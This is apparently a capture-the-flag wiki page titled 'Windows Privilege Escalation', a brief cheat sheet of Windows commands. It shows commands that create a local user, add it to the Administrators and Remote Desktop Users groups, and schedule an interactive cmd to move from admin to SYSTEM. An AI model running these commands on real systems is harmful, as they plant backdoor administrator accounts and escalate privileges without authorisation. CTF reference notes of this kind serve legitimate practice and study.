---
layout: article
title: Windows Privilege Escalation
permalink: /wikis/ctf/windows-privilege-escalation
aside:
    toc: true
sidebar:
    nav: ctf
---


Adding users 
```
net user <username> <password> /ADD 
net localgroup administrators <username> /ADD 
net localgroup "Remote Desktop Users" username /ADD 
```
<br>
<br>
Admin to System 
```
at 13:01 /interactive cmd
```